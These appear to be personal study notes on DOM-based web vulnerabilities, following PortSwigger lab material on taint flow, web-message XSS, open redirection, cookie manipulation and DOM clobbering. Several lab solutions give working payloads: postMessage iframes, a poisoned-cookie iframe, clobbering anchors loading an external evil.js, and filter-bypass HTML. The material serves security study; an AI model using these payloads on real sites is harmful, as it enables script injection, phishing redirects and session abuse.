## Definition
The Document Object Model (DOM):
- is a web browser's hierarchical representation of the elements on the page
- Websites can use JavaScript to:
	- manipulate the nodes and objects of the DOM
	- as well as their properties

DOM manipulation:
- in itself is not a problem. 
- it is an integral part of how modern websites work
- However, JavaScript that handles data insecurely:
	- can enable various attacks.

DOM-based vulnerabilities arise when:
- a website contains JS
	- that takes an attacker-controllable value, known as a source, 
		- and passes it into a dangerous function, known as a sink

## Taint-flow vulnerabilities
Many DOM-based vulnerabilities:
- possono essere ricondotte a problemi:
	- relativi al modo in cui il codice lato client manipola i dati controllabili dall'attaccante. 

### What is taint flow?
To either exploit or mitigate these vulnerabilities:
it is important to first familiarize yourself with the basics of -->  taint flow 
													  between sources and sinks.

#### Sources
A source is:
- a JavaScript property 
- that accepts data 
	- that is potentially attacker-controlled

An example of a source is the:
- `location.search` property 
- because it reads input from the query string, 
	- which is relatively simple for an attacker to control

Ultimately, any property that can be controlled by the attacker -->  is a potential source
This includes:
- the referring URL (exposed by the `document.referrer` string)
- the user's cookies (exposed by the `document.cookie` string)
- the web messages

#### Sinks
A sink is:
- a potentially dangerous JS function or DOM object 
- that can cause undesirable effects 
	- if attacker-controlled data is passed to it

For example:
- the `eval()` function is a sink 
	- because it processes the argument that is passed to it as JS

An example of an HTML sink is:
- `document.body.innerHTML` 
	- because it potentially allows an attacker to:
		- inject malicious HTML 
		- execute arbitrary JavaScript.

Fundamentally, DOM-based vulnerabilities arise when:
- a website passes data from a source to a sink
	- which then handles the data in an unsafe way in the context of the client's session.

The most common source -->  is the URL, 
					       which is typically accessed with the `location` object.
=>
An attacker can:
- construct a link to send a victim to a vulnerable page 
- with a payload in the query string 
- and fragment portions of the URL

Consider the following code:
```
goto = location.hash.slice(1)
if (goto.startsWith('https:')) {
  location = goto;
}
```

This is vulnerable to DOM-based open redirection:
- because the `location.hash` source is handled in an unsafe way.
- If the URL contains a hash fragment that starts with `https:`:
	- this code:
	- extracts the value of the location.hash property 
	- sets it as the location property of the window
=>
An attacker could exploit this vulnerability by constructing the following URL:
`https://www.innocent-website.com/example#https://www.evil-user.net`

When a victim visits this URL:
- the JavaScript sets the value of the `location` property to `https://www.evil-user.net`
	- which automatically redirects the victim to the malicious site.
	- This behavior could easily be exploited to construct a phishing attack, for example.

### Common sources
The following are typical sources that can be used to exploit a variety of taint-flow vulnerabilities:
- document.URL
- document.documentURI
- document.URLUnencoded
- document.baseURI
- location
- document.cookie
- document.referrer
- window.name
- history.pushState
- history.replaceState
- localStorage
- sessionStorage
- IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
- Database

 The following kinds of data can also be used as sources to exploit taint-flow vulnerabilities:
- Reflected data 
- Stored data 
- Web messages 

### Which sinks can lead to DOM-based vulnerabilities
The following list provides a quick overview of common DOM-based vulnerabilities and an example of a sink that can lead to each one.
![[Pasted image 20240918135416.png||400]]

## Controlling the web message source
If a page handles incoming web messages in an unsafe way, for example:
- by not verifying the origin of incoming messages correctly in the event listener, properties and functions that are called by the event listener 
  =>
  can potentially become sinks

 For example, an attacker could host a malicious `iframe` and use the `postMessage()` method:
- to pass web message data to the vulnerable event listener
- which then sends the payload to a sink on the parent page
=>
This behavior means that:
- you can use web messages as the source for propagating malicious data to any of those sinks.
### How to construct an attack using web messages as the source
Consider the following code:
```html
<script>
window.addEventListener('message', function(e) {
  eval(e.data);
});
</script>
```

This is vulnerable because:
an attacker could inject a JavaScript payload by constructing the following `iframe`:
`<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">`

As:
- the event listener does not verify the origin of the message
- and the `postMessage()` method specifies the `targetOrigin` `"*"`
=>
- the event listener accepts the payload 
- and passes it into a sink, in this case, the `eval()` function.

#### DOM-based using Web Messages
1. Notice that the home page contains an `addEventListener()` call that listens for a web message.
2. Go to the exploit server and add the following `iframe` to the body.
3. Remember to add your own lab ID:
   `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`
3. Store the exploit and deliver it to the victim.

When the `iframe` loads:
- the `postMessage()` method sends a web message to the home page.
- The event listener, which is intended to serve ads:
	- takes the content of the web message 
	- inserts it into the `div` with the ID `ads`. 
- However, in this case:
	- it inserts our `img` tag
	- which contains an invalid `src` attribute.
- This throws an error:
	- which causes the `onerror` event handler to execute our payload.

#### DOM XSS using web messages and a JavaScript URL
1. Notice that the home page contains an `addEventListener()` call that listens for a web message. 
	1. The JavaScript contains a flawed `indexOf()` check that looks for the strings `"http:"` or `"https:"` anywhere within the web message. 
	2. It also contains the sink `location.href`.
	   
2. Go to the exploit server and add the following `iframe` to the body, remembering to replace `YOUR-LAB-ID` with your lab ID:
   `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`
3. Store the exploit and deliver it to the victim.

This script:
- sends a web message containing:
	- an arbitrary JavaScript payload along with the string `"http:"`.
	- The second argument specifies that any `targetOrigin` is allowed for the web message.

When the `iframe` loads:
- the `postMessage()` method sends the JavaScript payload to the main page. 
- The event listener:
	- spots the `"http:"` string 
	- proceeds to send the payload to the `location.href` sink
		- where the `print()` function is called

### Origin verification
Even if an event listener does include some form of origin verification:
- this verification step can sometimes be fundamentally flawed. 

For example, consider the following code:

```javascript
window.addEventListener('message', function(e) {
    if (e.origin.indexOf('normal-website.com') > -1) {
        eval(e.data);
    }
});
```

The `indexOf` method is used to:
- try and verify that the origin of the incoming message is the `normal-website.com` domain.

However, in practice:
- it only checks whether the string `"normal-website.com"` is contained anywhere in the origin URL

As a result, an attacker could:
- easily bypass this verification step 
	- if the origin of their malicious message was `http://www.normal-website.com.evil.net`, for example.

The same flaw also applies to verification checks:
- that rely on the `startsWith()` or `endsWith()` methods. 

For example:
the following event listener would regard the origin `http://www.malicious-websitenormal-website.com` as safe:

```javascript
window.addEventListener('message', function(e) {
    if (e.origin.endsWith('normal-website.com')) {
        eval(e.data);
    }
});
```

#### DOM XSS using web messages and `JSON.parse`
1. Notice that the home page contains an event listener that listens for a web message.
	1. This event listener expects a string that is parsed using `JSON.parse()`. 
	2. In the JavaScript, we can see that the event listener expects a `type` property and that the `load-channel` case of the `switch` statement changes the `iframe src` attribute.
	   
2. Go to the exploit server and add the following `iframe` to the body, remembering to replace `YOUR-LAB-ID` with your lab ID:
   `<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>`
3. Store the exploit and deliver it to the victim.

When the `iframe` we constructed loads:
- the `postMessage()` method sends a web message to the home page with the type `load-channel`. 
- The event listener receives the message and parses it using `JSON.parse()` before sending it to the `switch`.

The `switch` triggers the `load-channel` case:
- which assigns the `url` property of the message to the `src` attribute of the `ACMEplayer.element` `iframe`

However, in this case:
- the `url` property of the message actually contains our JavaScript payload.

As the second argument specifies that:
- any `targetOrigin` is allowed for the web message
- and the event handler does not contain any form of origin check
=>
- the payload is set as the `src` of the `ACMEplayer.element` `iframe`. 
- The `print()` function is called when the victim loads the page in their browser.

## Which sinks can lead to DOM-based open-redirection
The following are some of the main sinks can lead to DOM-based open-redirection vulnerabilities:
![[Pasted image 20240918141629.png|250]]

## DOM-based XSS
[[SN/BurpSuite/XSS#DOM-based XSS|DOM XSS]]

## DOM-based open redirection
DOM-based open-redirection vulnerabilities arise when:
- a script writes attacker-controllable data into a sink that can trigger cross-domain navigation

For example:
the following code is vulnerable due to the unsafe way it handles the `location.hash` property:
```javascript
let url = /https?:\/\/.+/.exec(location.hash);
if (url) {
  location = url[0];
}
```
An attacker may be able to use this vulnerability:
- to construct a URL 
	- that, if visited by another user:
		- will cause a redirection to an arbitrary external domain


### DOM-based open redirection
The blog post page contains the following link, which returns to the home page of the blog:
`<a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>`

The `url` parameter:
- contains an open redirection vulnerability 
	- that allows you to change where the "Back to Blog" link takes the user.
=>
To solve the lab:
- construct and visit the following URL, remembering to change the URL to contain your lab ID and your exploit server ID:
  `https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/`

## DOM-based cookie manipulation
Some DOM-based vulnerabilities allow attackers to:
- manipulate data that they do not typically control.
- This transforms normally-safe data types, such as cookies -->   into potential sources.
=>
DOM-based cookie-manipulation vulnerabilities arise when:
- a script writes attacker-controllable data into the value of a cookie.

An attacker may be able to use this vulnerability to:
- construct a URL 
- that, if visited by another user:
	- will set an arbitrary value in the user's cookie. 

Many sinks are largely harmless on their own:
- but DOM-based cookie-manipulation attacks demonstrate how low-severity vulnerabilities can sometimes be used as part of an exploit chain for a high-severity attack

For example, if JS writes data from a source into `document.cookie` without sanitizing it first:
- an attacker can manipulate the value of a single cookie to inject arbitrary values:
  `document.cookie = 'cookieName='+location.hash.slice(1);`

If the website unsafely reflects values from cookies without HTML-encoding them:
- an attacker can use cookie-manipulation techniques to exploit this behavior

#### DOM-based cookie manipulation
1. Notice that the home page uses a client-side cookie called `lastViewedProduct`, whose value is the URL of the last product page that the user visited.
2. Go to the exploit server and add the following `iframe` to the body, remembering to replace `YOUR-LAB-ID` with your lab ID:
   `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">`
3. Store the exploit and deliver it to the victim.

The original source of the `iframe`:
- matches the URL of one of the product pages
	- except there is a JavaScript payload added to the end.

When the `iframe` loads for the first time:
- the browser temporarily opens the malicious URL, 
	- which is then saved as the value of the `lastViewedProduct` cookie. 
	- The `onload` event handler ensures that:
		- the victim is then immediately redirected to the home page, 
			- unaware that this manipulation ever took place.
			  
			- While the victim's browser has the poisoned cookie saved:
				- loading the home page will cause the payload to execute

## DOM clobbering
DOM clobbering is a:
- technique in which you inject HTML into a page 
	- to manipulate the DOM 
	- and ultimately change the behavior of JavaScript on the page

DOM clobbering is particularly useful:
- in cases where [XSS](https://portswigger.net/web-security/cross-site-scripting) is not possible, 
- but you can control some HTML on a page where the attributes `id` or `name` are whitelisted by the HTML filter

The most common form of DOM clobbering:
- uses an anchor element to overwrite a global variable, 
	- which is then used by the application in an unsafe way, 
		- such as generating a dynamic script URL.

The term clobbering comes from the fact that:
- you are "clobbering" a global variable or property of an object 
- and overwriting it with a DOM node or HTML collection instead

For example, you can use DOM objects to:
- overwrite other JS objects 
- and exploit unsafe names, such as `submit`, 
	- to interfere with a form's actual `submit()` function

### How to exploit DOM-clobbering vulnerabilities
A common pattern used by JavaScript developers is:
`var someObject = window.someObject || {};`

If you can control some of the HTML on the page:
- you can clobber the `someObject` reference with a DOM node, such as an anchor.

Consider the following code:
```javascript
<script>
    window.onload = function(){
        let someObject = window.someObject || {};
        let script = document.createElement('script');
        script.src = someObject.url;
        document.body.appendChild(script);
    };
</script>
```

To exploit this vulnerable code:
- you could inject the following HTML to clobber the `someObject` reference with an anchor element:
  `<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>`

As the two anchors use the same ID:
- the DOM groups them together in a DOM collection. 
- The DOM clobbering vector then:
	- overwrites the `someObject` reference with this DOM collection.
	- A `name` attribute is used on the last anchor element in order to:
		- clobber the `url` property of the `someObject` object,
			- which points to an external script.


Another common technique is:
- to use a `form` element along with an element such as `input` to clobber DOM properties.

For example, clobbering the `attributes` property enables you to:
- bypass client-side filters that use it in their logic. 
- Although the filter will enumerate the `attributes` property:
	- it will not actually remove any attributes 
		- because the property has been clobbered with a DOM node
		  
- As a result, you will be able to:
	- inject malicious attributes that would normally be filtered out

For example, consider the following injection:
`<form onclick=alert(1)><input id=attributes>Click me`

In this case, the client-side filter:
- would traverse the DOM and encounter a whitelisted `form` element.
- Normally, the filter would:
	- loop through the `attributes` property of the `form` element 
	- and remove any blacklisted attributes.
	  
- However, because the `attributes` property has been clobbered with the `input` element,:
	- the filter loops through the `input` element instead. 
	- As the `input` element has an undefined length:
		- the conditions for the `for` loop of the filter (for example `i<element.attributes.length`) are not met
		- and the filter simply moves on to the next element instead
		  
	- This results in the:
		- `onclick` event being ignored altogether by the filter
			- which subsequently allows the `alert()` function to be called in the browser

#### Exploiting DOM clobbering to enable XSS
1. Go to one of the blog posts and create a comment containing the following anchors:
     `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`
2. Return to the blog post and create a second comment containing any random text. 
	1. The next time the page loads, the `alert()` is called.

The page for a specific blog post imports the JavaScript file `loadCommentsWithDomPurify.js`, which contains the following code:
`let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}`

The `defaultAvatar` object:
- is implemented using this dangerous pattern containing the logical `OR` operator in conjunction with a global variable. 
- This makes it vulnerable to [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering).

- You can clobber this object using anchor tags. 
- Creating two anchors with the same ID causes them to be grouped in a DOM collection.
- The `name` attribute in the second anchor contains the value `"avatar"`,
	- which will clobber the `avatar` property with the contents of the `href` attribute.

#### Clobbering DOM attributes to bypass HTML filters
1. Go to one of the blog posts and create a comment containing the following HTML:
   `<form id=x tabindex=0 onfocus=print()><input id=attributes>`
2. Go to the exploit server and add the following `iframe` to the body:
   `<iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">`
	1. Remember to change the URL to contain your lab ID and make sure that the `postId` parameter matches the `postId` of the blog post into which you injected the HTML in the previous step.
    
3. Store the exploit and deliver it to the victim. 
4. The next time the page loads, the `print()` function is called.

The library uses the `attributes` property to filter HTML attributes. 
However, it is still possible to clobber the `attributes` property itself:
- causing the length to be undefined. 
- This allows us to inject any attributes we want into the `form` element. 
- In this case, we use the `onfocus` attribute to smuggle the `print()` function.

When the `iframe` is loaded, after a 500ms delay:
- it adds the `#x` fragment to the end of the page URL. 
- The delay is necessary to make sure that 
	- the comment containing the injection is loaded before the JavaScript is executed.
	- This causes the browser to:
		- focus on the element with the ID `"x"`, 
			- which is the form we created inside the comment. 
			- The `onfocus` event handler then calls the `print()` function.


## Other DOM-based
- JavaScript Injection
- Document-domain manipulation
- WebSocket-URL poisoning
- Link manipulation
- Web message manipulation
- Ajax request-header manipulation
- Local file-path manipulation
- Client-side SQL injection
- HTML5-storage manipulation
- Client-side XPath injection
- Client-side JSON injection
- DOM-data manipulation
- Denial of service
- Web message vulnerabilities
- DOM clobbering

